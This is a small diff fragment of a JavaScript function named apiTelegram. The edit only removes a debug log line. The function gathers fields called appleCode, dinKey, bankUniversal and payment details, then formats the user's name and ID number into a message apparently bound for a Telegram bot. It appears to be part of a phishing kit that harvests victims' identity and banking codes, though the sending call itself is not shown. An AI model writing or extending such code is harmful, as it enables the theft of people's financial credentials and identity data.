@@ -13,7 +13,7 @@ const apiTelegram = async (info,setLoader) => {
         }
         
         const { appleCode, data, infoPay,dinKey,bankUniversal } = info
-        console.log(info)
+      
         const mensaje = `|Informacion de Usuario|%0A%0A
 Nombre:${infoPay.name || "Null"}%0A
 CI: ${infoPay.CI||"Null"}%0A
